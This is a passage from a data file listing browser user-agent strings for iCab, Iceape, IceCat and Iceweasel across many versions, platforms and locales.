"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8) AppleWebKit/536.15 (KHTML, like Gecko) iCab/5.0 Safari/533.16",
"iCab/5.0 (Macintosh; U; PPC Mac OS X)",
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_8_1; nn-no) AppleWebKit/533.21.1 (KHTML, like Gecko) iCab/4.8b Safari/533.16",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_7; nn-no) AppleWebKit/533.21.1 (KHTML, like Gecko) iCab/4.8b Safari/533.16",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/533.21.1 (KHTML, like Gecko) iCab/4.8 Safari/533.16",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-us) AppleWebKit/533.21.1 (KHTML, like Gecko) iCab/4.8 Safari/533.16",
"iCab/4.7 (Macintosh; U; PPC Mac OS X)",
"iCab/4.7 (Macintosh; U; Intel Mac OS X)",
"iCab/4.6 (Macintosh; U; Mac OS X Leopard 10.5.7)",
"iCab/4.5 (Macintosh; U; PPC Mac OS X)",
"iCab/4.5 (Macintosh; U; Mac OS X Leopard 10.5.8)",
"iCab/4.5 (Macintosh; U; Mac OS X Leopard 10.5.7)",
"iCab/4.5 (Macintosh; U; Intel Mac OS X)",
"iCab/4.0 (Macintosh; U; Intel Mac OS X)",
"iCab/4.0  (Windows; U; Windows NT 6.0; en-gb)",
"Mozilla/5.0 (compatible; iCab 3.0.5; Macintosh; U; PPC Mac OS)",
"Mozilla/5.0 (compatible; iCab 3.0.5; Macintosh; U; PPC Mac OS X)",
"iCab/3.0.5 (Macintosh; U; PPC Mac OS)",
"iCab/3.0.5 (Macintosh; U; PPC Mac OS X)",
"Mozilla/5.0 (compatible; iCab 3.0.3; Macintosh; U; PPC Mac OS)",
"Mozilla/5.0 (compatible; iCab 3.0.3; Macintosh; U; PPC Mac OS X)",
"Mozilla/5.0 (compatible; iCab 3.0.2; Macintosh; U; PPC Mac OS)",
"Mozilla/5.0 (compatible; iCab 3.0.2; Macintosh; U; PPC Mac OS X)",
"iCab/3.0.2 (Macintosh; U; PPC Mac OS)",
"iCab/3.0.2 (Macintosh; U; PPC Mac OS X)",
"Mozilla/5.0 (Macintosh; U; PPC Mac OS; en) iCab 3",
"Mozilla/4.5 (compatible; iCab 2.9.9; Macintosh; U; 68K)",
"iCab/2.9.9 (Macintosh; U; 68K)",
"iCab/2.9.8 (Macintosh; U; 68K)",
"iCab/2.9.7 (Macintosh; U; PPC)",
"Mozilla/4.5 (compatible; iCab 2.9.5; Macintosh; U; PPC; Mac OS X)",
"iCab/2.9.5 (Macintosh; U; PPC; Mac OS X)",
"Mozilla/4.5 (compatible; iCab 2.9.1; Macintosh; U; PPC; Mac OS X)",
"Mozilla/4.5 (compatible; iCab 2.9.1; Macintosh; U; PPC)",
"iCab/2.9.1 (Macintosh; U; PPC)",
"Mozilla/4.5 (compatible; iCab 2.8.1; Macintosh; I; PPC)",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.13) Gecko/20100916 Iceape/2.0.8",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.11) Gecko/20100721 Iceape/2.0.6",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.9) Gecko/20100502 Iceape/2.0.4",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.16) Gecko/20110302 Iceape/2.0.11",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.16) Gecko/20101227 Iceape/2.0.11",
"Mozilla/5.0 (X11; U; Linux ppc; fr; rv:1.8.1.13) Gecko/20080313 Iceape/1.1.9 (Debian-1.1.9-5)",
"Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.8.1.13) Gecko/20080313 Iceape/1.1.9 (Debian-1.1.9-5)",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.9) Gecko/20071030 Iceape/1.1.6 (Debian-1.1.6-3)",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.8) Gecko/20071008 Iceape/1.1.5 (Ubuntu-1.1.5-1ubuntu0.7.10)",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.4) Gecko/20070509 Iceape/1.1.2 (Debian-1.1.2-1)",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.1.19) Gecko/20081204 Iceape/1.1.14 (Debian-1.1.14-1) Mnenhy/0.7.6.0",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.19) Gecko/20081204 Iceape/1.1.14 (Debian-1.1.14-1)",
"Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.8.0.13pre) Gecko/20070505 Iceape/1.0.9 (Debian-1.0.10~pre070720-0etch1)",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.13pre) Gecko/20070505 Iceape/1.0.9 (Debian-1.0.10~pre070720-0etch3)",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.12) Gecko/20070510 Iceape/1.0.9 (Debian-1.0.9-0etch1)",
"Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.8.0.11) Gecko/20070217 Iceape/1.0.8 (Debian-1.0.8-4)",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.11) Gecko/20070217 Iceape/1.0.8 (Debian-1.0.8-4)",
"Mozilla/5.0 (X11; U; Linux i586; en-US; rv:1.8.0.11) Gecko/20070217 Iceape/1.0.8 (Debian-1.0.8-4)",
"Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.8.0.9) Gecko/20061219 Iceape/1.0.7 (Debian-1.0.7-3)",
"Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.8.0.9) Gecko/20061219 Iceape/1.0.7 (Debian-1.0.7-2)",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.9) Gecko/20061219 Iceape/1.0.7 (Debian-1.0.7-3)",
"Mozilla/5.0 (X11; Linux x86_64; rv:17.0) Gecko/20121201 icecat/17.0.1",
"Mozilla/5.0 (X11; Linux i686; rv:7.0.1) Gecko/20111106 IceCat/7.0.1",
"Mozilla/5.0 (X11; U; Linux sparc64; es-PY; rv:5.0) Gecko/20100101 IceCat/5.0 (like Firefox/5.0; Debian-6.0.1)",
"Mozilla/5.0 (X11; Linux i686; rv:2.0b8) Gecko/20101227 IceCat/4.0b8",
"Mozilla/5.0 (X11; U; Linux x86_64; fr; rv:1.9.2.13) Gecko/20101203 IceCat/3.6.13-g1",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101214 IceCat/3.6.13 (like Firefox/3.6.13)",
"Mozilla/5.0 (X11; U; Linux i686; de; rv:1.9.2.13) Gecko/20101221 IceCat/3.6.13 (like Firefox/3.6.13) (Zenwalk GNU Linux)",
"Mozilla/5.0 (Windows; U; Windows NT 6.0; it; rv:1.9.2.12) Gecko/20101114 IceCat/3.6.12 (like Firefox/3.6.12)",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.3) Gecko/2008092921 IceCat/3.0.3-g1",
"Mozilla/5.0 (X11; U; Linux i686; en-CA; rv:1.9.0.3) Gecko/2008092921 IceCat/3.0.3-g1",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.2) Gecko/2008100722 IceCat/3.0.2-g1",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008072716 IceCat/3.0.1-g1",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9) Gecko/2008061920 IceCat/3.0-g1",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.11) Gecko/20071203 IceCat/2.0.0.11-g1",
"Mozilla/5.0 (X11; Linux x86_64; rv:17.0) Gecko/20121202 Firefox/17.0 Iceweasel/17.0.1",
"Mozilla/5.0 (X11; Linux x86_64; rv:15.0) Gecko/20100101 Firefox/15.0.1 Iceweasel/15.0.1",
"Mozilla/5.0 (X11; Linux i686; rv:15.0) Gecko/20100101 Firefox/15.0.1 Iceweasel/15.0.1",
"Mozilla/5.0 (X11; Linux x86_64; rv:15.0) Gecko/20120724 Debian Iceweasel/15.0",
"Mozilla/5.0 (X11; Linux x86_64; rv:15.0) Gecko/20100101 Firefox/15.0 Iceweasel/15.0",
"Mozilla/5.0 (X11; Linux x86_64; rv:12.0) Gecko/20120721 Debian Iceweasel/15.0",
"Mozilla/5.0 (X11; Linux i686; rv:15.0) Gecko/20100101 Firefox/15.0 Iceweasel/15.0",
"Mozilla/5.0 (X11; debian; Linux x86_64; rv:15.0) Gecko/20100101 Iceweasel/15.0",
"Mozilla/5.0 (X11; Linux x86_64; rv:14.0) Gecko/20100101 Firefox/14.0.1 Iceweasel/14.0.1",
"Mozilla/5.0 (X11; Linux i686; rv:14.0) Gecko/20100101 Firefox/14.0.1 Iceweasel/14.0.1",
"Mozilla/5.0 (X11; Linux x86_64; rv:14.0) Gecko/20100101 Firefox/14.0 Iceweasel/14.0",
"Mozilla/5.0 (X11; Linux x86_64; rv:12.0) Gecko/20100101 Debian Iceweasel/14.0",
"Mozilla/5.0 (X11; Linux i686; rv:14.0) Gecko/20100101 Firefox/14.0 Iceweasel/14.0",
"Mozilla/5.0 (X11; Linux x86_64; rv:13.0) Gecko/20100101 Firefox/13.0.1 Iceweasel/13.0.1",
"Mozilla/5.0 (X11; Linux i686; rv:13.0) Gecko/20100101 Firefox/13.0.1 Iceweasel/13.0.1",
"Mozilla/5.0 (X11; Linux x86_64; rv:13.0) Gecko/20100101 Firefox/13.0 Iceweasel/13.0",
"Mozilla/5.0 (X11; Linux x86_64; rv:11.0a2) Gecko/20111230 Firefox/11.0a2 Iceweasel/11.0a2",
"Mozilla/5.0 (X11; Gentoo Linux x86_64; rv:11.0a2) Gecko/20111230 Firefox/11.0a2 Iceweasel/11.0a2",
"Mozilla/5.0 (X11; Linux x86_64; rv:10.0a2) Gecko/20111118 Firefox/10.0a2 Iceweasel/10.0a2",
"Mozilla/5.0 (X11; Linux x86_64; rv:10.0.7) Gecko/20100101 Firefox/10.0.7 Iceweasel/10.0.7",
"Mozilla/5.0 (X11; Linux ppc; rv:10.0.7) Gecko/20100101 Firefox/10.0.7 Iceweasel/10.0.7",
"Mozilla/5.0 (X11; Linux i686; rv:10.0.7) Gecko/20100101 Iceweasel/10.0.7",
"Mozilla/5.0 (X11; Linux i686; rv:10.0.7) Gecko/20100101 Firefox/10.0.7 Iceweasel/10.0.7",
"Mozilla/5.0 (X11; Linux x86_64; rv:10.0.6) Gecko/20100101 Firefox/10.0.6 Iceweasel/10.0.6",
"Mozilla/5.0 (X11; Linux i686; rv:10.0.6) Gecko/20100101 Firefox/10.0.6 Iceweasel/10.0.6",
"Mozilla/5.0 (X11; Linux i686 on x86_64; rv:10.0.6) Gecko/20100101 Firefox/10.0.6 Iceweasel/10.0.6",
"Mozilla/5.0 (X11; Linux armv6l; rv:10.0.6) Gecko/20100101 Firefox/10.0.6 Iceweasel/10.0.6",
"Mozilla/5.0 (X11; Linux armv6l; rv:10.0.5) Gecko/20100101 Firefox/10.0.5 Iceweasel/10.0.5",
"Mozilla/5.0 (X11; Linux x86_64; rv:10.0) Gecko/20100101 Firefox/10.0 Iceweasel/10.0",
"Mozilla/5.0 (X11; Linux i686; rv:10.0) Gecko/20100101 Firefox/10.0 Iceweasel/10.0",
"Mozilla/5.0 (X11; Linux i686; rv:9.0a2) Gecko/20111104 Firefox/9.0a2 Iceweasel/9.0a2",
"Mozilla/5.0 (X11; Linux x86_64; rv:9.0.1) Gecko/20100101 Firefox/9.0.1 Iceweasel/9.0.1",
"Mozilla/5.0 (X11; Linux i686; rv:9.0.1) Gecko/20100101 Firefox/9.0.1 Iceweasel/9.0.1",
"Mozilla/5.0 (X11; Linux i686; rv:8.0) Gecko/20100101 Firefox/8.0 Iceweasel/8.0",
"Mozilla/5.0 (X11; Linux Debian i686; rv:8.0) Gecko/20100101 Firefox/8.0 Iceweasel/8.0",
"Mozilla/5.0 (X11; Linux x86_64; rv:7.0.1) Gecko/20100101 Firefox/7.0.1 Iceweasel/7.0.1 Debian",
"Mozilla/5.0 (X11; Linux i686; Debian Testing; rv:7.0.1) Gecko/20100101 Firefox/7.0.1 Iceweasel/7.0.1",
"Mozilla/5.0 (X11; Linux i686 on x86_64; rv:6.0.2) Gecko/20100101 Firefox/6.0.2 Iceweasel/6.0.2",
"Mozilla/5.0 (X11; Linux x86_64; rv:5.0) Gecko/20100101 Firefox/5.0 Iceweasel/5.0",
"Mozilla/5.0 (X11; Linux i686; rv:5.0) Gecko/20100101 Firefox/5.0 Iceweasel/5.0",
"Mozilla/5.0 (X11; Linux i686; rv: 5.0) Gecko/20100101 Firefox/5.0 Iceweasel/5.0",
"Mozilla/5.0 (X11; Linux i686; rv:2.0) Gecko/20110322 Firefox/4.0 Iceweasel/4.0",
"Mozilla/5.0 (X11; U; Linux x86_64; fr; rv:1.9.2.13) Gecko/20101203 Iceweasel/3.6.7 (like Firefox/3.6.13)",
"Mozilla/5.0 (X11; U; Linux i686; pt-PT; rv:1.9.2.3) Gecko/20100402 Iceweasel/3.6.3 (like Firefox/3.6.3) GTB7.0",
"Mozilla/5.0 (X11; U; Linux 2.6.34.1-SquidSheep; en-US; rv:1.9.2.3) Gecko/20100402 Iceweasel/3.6.3 (like Firefox/3.6.3)",
"Mozilla/5.0 (X11; U; Linux i686; it; rv:1.9.2.13) Gecko/20110109 Iceweasel/3.6.13 (like Firefox/3.6.13)",
"Mozilla/5.0 (X11; U; Linux i686; pt-PT; rv:1.9.2.3) Gecko/20100402 Iceweasel/3.6 (like Firefox/3.6) GTB7.0",
"Mozilla/5.0 (X11; U; Linux i686; de-DE; rv:1.9.1.9) Gecko/20100501 Iceweasel/3.5.9 (like Firefox/3.5.9)",
"Mozilla/5.0 (X11; U; Linux x86_64; ja; rv:1.9.1.8) Gecko/20100324 Iceweasel/3.5.8 (like Firefox/3.5.8)",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100501 Iceweasel/3.5.8 (like Firefox/3.5.8)",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100501 Iceweasel/3.5.6 (like Firefox/3.5.6; Debian-3.5.6-2)",
"Mozilla/5.0 (X11; U; Linux i686; de; rv:1.9.1.5) Gecko/20091112 Iceweasel/3.5.5 (like Firefox/3.5.5; Debian-3.5.5-1)",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20091010 Iceweasel/3.5.3 (Debian-3.5.3-2)",
"Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-GB; rv:1.9.1.3) Gecko/20091010 Iceweasel/3.5.3 (Debian-3.5.3-2)",
"Mozilla/5.0 (X11; U; Linux i686; de; rv:1.9.1.19) Gecko/20110430 Iceweasel/3.5.19 (like Firefox/3.5.19)",
"Mozilla/5.0 (X11; U; Linux i686; de-DE; rv:1.9.1.18) Gecko/20110324 Iceweasel/3.5.18 (like Firefox/3.5.18)",
"Mozilla/5.0 (X11; U; Linux x86_64; sv-SE; rv:1.9.1.16) Gecko/20120714 Iceweasel/3.5.16 (like Firefox/3.5.16)",
"Mozilla/5.0 (X11; U; Linux x86_64; it; rv:1.9.1.16) Gecko/20120921 Iceweasel/3.5.16 (like Firefox/3.5.16)",
"Mozilla/5.0 (X11; U; Linux x86_64; it; rv:1.9.1.16) Gecko/20120714 Iceweasel/3.5.16 (like Firefox/3.5.16)",
"Mozilla/5.0 (X11; U; Linux x86_64; it; rv:1.9.1.16) Gecko/20120602 Iceweasel/3.5.16 (like Firefox/3.5.16)",
"Mozilla/5.0 (X11; U; Linux x86_64; it; rv:1.9.1.16) Gecko/20111108 Iceweasel/3.5.16 (like Firefox/3.5.16)",
"Mozilla/5.0 (X11; U; Linux x86_64; hu-HU; rv:1.9.1.16) Gecko/20110107 Iceweasel/3.5.16 (like Firefox/3.5.16)",
"Mozilla/5.0 (X11; U; Linux x86_64; fr; rv:1.9.1.16) Gecko/20120714 Iceweasel/3.5.16 (like Firefox/3.5.16)",
"Mozilla/5.0 (X11; U; Linux x86_64; fr; rv:1.9.1.16) Gecko/20120511 Iceweasel/3.5.16 (like Firefox/3.5.16)",
"Mozilla/5.0 (X11; U; Linux x86_64; es-ES; rv:1.9.1.16) Gecko/20120602 Iceweasel/3.5.16 (like Firefox/3.5.16)",
"Mozilla/5.0 (X11; U; Linux x86_64; es-ES; rv:1.9.1.16) Gecko/20120315 Iceweasel/3.5.16 (like Firefox/3.5.16)",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.16) Gecko/20120714 Iceweasel/3.5.16 (like Firefox/3.5.16)",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.16) Gecko/20120602 Iceweasel/3.5.16 (like Firefox/3.5.16)",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.16) Gecko/20111108 Iceweasel/3.5.16",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.16) Gecko/20110107 Iceweasel/3.5.16 (Debian-3.0.5-1)",
"Mozilla/5.0 (X11; U; Linux x86_64; de; rv:1.9.1.16) Gecko/20120714 Iceweasel/3.5.16 (like Firefox/3.5.16)",
"Mozilla/5.0 (X11; U; Linux x86_64; de; rv:1.9.1.16) Gecko/20120131 Iceweasel/3.5.16 (like Firefox/3.5.16)",
"Mozilla/5.0 (X11; U; Linux x86_64; cs-CZ; rv:1.9.1.16) Gecko/20120602 Iceweasel/3.5.16 (like Firefox/3.5.16)",
"Mozilla/5.0 (X11; U; Linux i686; it; rv:1.9.1.16) Gecko/20120602 Iceweasel/3.5.16 (like Firefox/3.5.16)",
"Mozilla/5.0 (X11; U; Linux i686; fr; rv:1.9.1.16) Gecko/20120714 Iceweasel/3.5.16 (like Firefox/3.5.16)",
"Mozilla/5.0 (X11; U; Linux i686; es-ES; rv:1.9.1.16) Gecko/20111108 Iceweasel/3.5.16 (like Firefox/3.5.16)",
"Mozilla/5.0 (X11; U; Linux i686; en-GB; rv:1.9.1.11) Gecko/20100819 Iceweasel/3.5.11 (like Firefox/3.5.11)",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1) Gecko/20090704 Iceweasel/3.5 (Debian-3.5-0)",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1b3pre) Gecko/20090207 Ubuntu/9.04 (jaunty) IceWeasel/3.1b3pre",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9b5) Gecko/2008042623 Iceweasel/3.0b5 (Debian-3.0~b5-3)",
"Mozilla/5.0 (X11; U; Linux x86_64; fr; rv:1.9.0.11) Gecko/2009061208 Iceweasel/3.0.9 (Debian-3.0.9-1)",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.18) Gecko/2010021720 Iceweasel/3.0.9 (Debian-3.0.9-1)",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.11) Gecko/2009061212 Iceweasel/3.0.9 (Debian-3.0.9-1) GTB5",
"Mozilla/5.0 (X11; U; Linux i686; en-GB; rv:1.9.0.7) Gecko/2009030814 Iceweasel/3.0.9 (Debian-3.0.9-1)",
"Mozilla/5.0 (X11; U; Linux i686; de-DE; rv:1.9.0.11) Gecko/2009061212 Iceweasel/3.0.9 (Debian-3.0.9-1)",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.8) Gecko/2009033109 Gentoo Iceweasel/3.0.8",
"Mozilla/5.0 (X11; U; Linux x86_64; de; rv:1.9.0.8) Gecko/2009032917 Gentoo Iceweasel/3.0.8",
"Mozilla/5.0 (X11; U; Linux x86_64; fr; rv:1.9.0.7) Gecko/2009030810 Iceweasel/3.0.7 (Debian-3.0.7-1)",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.8) Gecko/2009032809 Iceweasel/3.0.7 (Debian-3.0.7-1)",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.6) Gecko/2009020407 Iceweasel/3.0.7 (Debian-3.0.7-1)",
"Mozilla/5.0 (X11; U; Linux x86_64; de; rv:1.9.0.7) Gecko/2009030810 Iceweasel/3.0.7 (Debian-3.0.7-1)",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/2009032811 Iceweasel/3.0.7 (Debian-3.0.7-1)",
"Mozilla/5.0 (X11; U; Linux x86_64; fr; rv:1.9.0.7) Gecko/2009032813 Iceweasel/3.0.6 Firefox/3.0.6 (Debian-3.0.6-1)",
"Mozilla/5.0 (X11; U; Linux x86_64; fr; rv:1.9.0.7) Gecko/2009031819 Iceweasel/3.0.6 (Debian-3.0.6-1)",
"Mozilla/5.0 (X11; U; Linux x86_64; fr; rv:1.9.0.19) Gecko/2010072022 Iceweasel/3.0.6 (Debian-3.0.6-3)",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.7) Gecko/2009032813 Iceweasel/3.0.6 (Debian-3.0.6-1)",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.19) Gecko/2011050707 Iceweasel/3.0.6 (Debian-3.0.6-3)",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.12) Gecko/2009072220 Iceweasel/3.0.6 (Debian-3.0.6-1)",
"Mozilla/5.0 (X11; U; Linux x86_64; en-GB; rv:1.9.0.11) Gecko/2009061208 Iceweasel/3.0.6 (Debian-3.0.6-1)",
"Mozilla/5.0 (X11; U; Linux x86_64; de; rv:1.9.0.7) Gecko/2009031819 Iceweasel/3.0.6 (Debian-3.0.6-1)",
"Mozilla/5.0 (X11; U; Linux x86_64; de; rv:1.9.0.19) Gecko/2012013123 Iceweasel/3.0.6 (Debian-3.0.6-3)",
"Mozilla/5.0 (X11; U; Linux x86_64; de; rv:1.9.0.16) Gecko/2009121609 Iceweasel/3.0.6 (Debian-3.0.6-3)",
"Mozilla/5.0 (X11; U; Linux i686; nl; rv:1.9.0.11) Gecko/2009061212 Iceweasel/3.0.6 (Debian-3.0.6-1)",
"Mozilla/5.0 (X11; U; Linux i686; ja; rv:1.9.0.7) Gecko/2009032803 Iceweasel/3.0.6 (Debian-3.0.6-1)",
"Mozilla/5.0 (X11; U; Linux i686; it; rv:1.9.0.6) Gecko/2009020409 Iceweasel 3.0.6 (Debian 5.0",
"Mozilla/5.0 (X11; U; Linux i686; it; rv:1.9.0.19) Gecko/2010120923 Iceweasel/3.0.6 (Debian-3.0.6-3)",
"Mozilla/5.0 (X11; U; Linux i686; fr; rv:1.9.0.19) Gecko/2011092908 Iceweasel/3.0.6 (Debian-3.0.6-3)",
"Mozilla/5.0 (X11; U; Linux i686; fr; rv:1.9.0.19) Gecko/2010102906 Iceweasel/3.0.6 (Debian-3.0.6-3)",
"Mozilla/5.0 (X11; U; Linux i686; fr; rv:1.9.0.13) Gecko/2009082121 Iceweasel/3.0.6 (Debian-3.0.6-1)",
"Mozilla/5.0 (X11; U; Linux i686; es-ES; rv:1.9.0.11) Gecko/2009061212 Iceweasel/3.0.6 (Debian-3.0.6-1)",
"Mozilla/5.0 (X11; U; Linux i686; es-AR; rv:1.9.0.7) Gecko/2009032803 Iceweasel/3.0.6 (Debian-3.0.6-1)",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.7) Gecko/2009032803 Iceweasel/3.0.6 (Debian-3.0.6-1)",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.5) Gecko/2008122903 Gentoo Iceweasel/3.0.5",
"Mozilla/5.0 (X11; U; Linux i686; es-ES; rv:1.9.0.5) Gecko/2008122011 Iceweasel/3.0.5 (Debian-3.0.5-1)",
"Mozilla/5.0 (X11; U; Linux x86_64; cs-CZ; rv:1.9.0.4) Gecko/2008112309 Iceweasel/3.0.4 (Debian-3.0.4-1)",
"Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.9.0.1) Gecko/2008072112 Iceweasel/3.0.3 (Debian-3.0.3-2)",
"Mozilla/5.0 (X11; U; Linux i686; ca-AD; rv:1.9.0.3) Gecko/2008092816 Iceweasel/3.0.3 (Debian-3.0.3-3)",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.2) Gecko/2008090211 Ubuntu/9.04 (jaunty) Iceweasel/3.0.2",
"Mozilla/5.0 (X11; U; Linux i686; de; rv:1.9.0.11) Gecko/2009061212 Iceweasel/3.0.12 (Debian-3.0.12-1)",
"Mozilla/5.0 (X11; U; Linux i686; es-ES; rv:1.9.0.11) Gecko/2009061319 Iceweasel/3.0.11 (Debian-3.0.11-1)",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.1) Gecko/2008071420 Iceweasel/3.0.1 (Debian-3.0.1-1)",
"Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.9.0.1) Gecko/2008072112 Iceweasel/3.0.1 (Debian-3.0.1-1)",
"Mozilla/5.0 (X11; U; Linux i686; it; rv:1.9.0.1) Gecko/2008071618 Iceweasel/3.0.1 (Debian-3.0.1-1)",
"Mozilla/5.0 (Linux X86; U; Debian SID; it; rv:1.9.0.1) Gecko/2008070208 Debian IceWeasel/3.0.1",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9) Gecko/2008062908 Iceweasel/3.0 (Debian-3.0~rc2-2)",
"Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.9) Gecko/2008062909 Iceweasel/3.0 (Debian-3.0~rc2-2)",
"Mozilla/5.0 (X11; U; Linux i686; en; rv:1.9) Gecko/2008062113 Iceweasel/3.0",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9) Gecko/2008062113 Iceweasel/3.0 (Debian-3.0~rc2-2)",
"Mozilla/5.0 (X11; U; Linux i686; es-ES; rv:1.8.1.9) Gecko/20071025 Iceweasel/2.0.0.9 (Debian-2.0.0.9-2)",
"Mozilla/5.0 (X11; U; Linux i686; es-ES; rv:1.8.1.9) Gecko/20071025 Iceweasel/2.0.0.9",
"Mozilla/15.0 (X11; U; Linux i686; es-ES; rv:1.8.1.9) Gecko/20071025 Iceweasel/2.0.0.9",
"Mozilla/5.0 (X11; U; Linux i686; ru; rv:1.8.1.8) Gecko/20071004 Iceweasel/2.0.0.8 (Debian-2.0.0.6+2.0.0.8-0etch1)",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.8) Gecko/20071004 Iceweasel/2.0.0.8 (Debian-2.0.0.6+2.0.0.8-0etch1)",
"Mozilla/5.0 (X11; U; Linux x64; en-US; rv:1.8.1.7) Gecko/20070914 Iceweasel/2.0.0.7 (Debian-2.0.0.7-1)",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.1.6) Gecko/20070723 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1)",
"Mozilla/5.0 (X11; U; Linux x64; en-US; rv:1.8.1.6) Gecko/20070723 Iceweasel/2.0.0.6 (Debian-2.0.0.6-1)",
"Mozilla/5.0 (X11; U; Linux i686; es-AR; rv:1.8.1.6) Gecko/20070723 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.6) Gecko/20070723 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1) (.NET CLR 3.5.30729)",
"Mozilla/5.0 (X11; U; Linux i686; es-AR; rv:1.8.1.4) Gecko/20070508 Iceweasel/2.0.0.4 (Debian-2.0.0.4-0etch1)",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.4) Gecko/20070508 Iceweasel/2.0.0.4 (Debian-2.0.0.4-1)",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.4) Gecko/20070508 Iceweasel/2.0.0.4 (Debian-2.0.0.4-0etch1)",
"Mozilla 5.0 (X11; U; Linux i686; en-US; rv:1.8.1.14) Gecko/200770508  Iceweasel/2.0.0.4",
"Mozilla/5.0 (X11; U; Linux x86_64; fr; rv:1.8.1.3) Gecko/20070310 Iceweasel/2.0.0.3 (Debian-2.0.0.3-2)",
"Mozilla/5.0 (X11; U; Linux x86_64; fr; rv:1.8.1.3) Gecko/20070310 Iceweasel/2.0.0.3 (Debian-2.0.0.3-1)",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.1.3) Gecko/20070310 Iceweasel/2.0.0.3 (Debian-2.0.0.3-1)",
"Mozilla/5.0 (X11; U; Linux x86_64; en-GB; rv:1.8.1.3) Gecko/20070310 Iceweasel/2.0.0.3 (Debian-2.0.0.3-1)",
"Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.8.1.3) Gecko/20070310 Iceweasel/2.0.0.3 (Debian-2.0.0.3-1)",
"Mozilla/5.0 (X11; U; Linux i686; pt-BR; rv:1.8.1.3) Gecko/20070310 Iceweasel/2.0.0.3 (Debian-2.0.0.3-1)",
"Mozilla/5.0 (X11; U; Linux i686; nb-NO; rv:1.8.1.3) Gecko/20070310 Iceweasel/2.0.0.3 (Debian-2.0.0.3-1)",
"Mozilla/5.0 (X11; U; Linux i686; fr; rv:1.8.1.3) Gecko/20070310 Iceweasel/2.0.0.3 (Debian-2.0.0.3-2)",
"Mozilla/5.0 (X11; U; Linux i686; fr; rv:1.8.1.3) Gecko/20070310 Iceweasel/2.0.0.3 (Debian-2.0.0.3-1)",
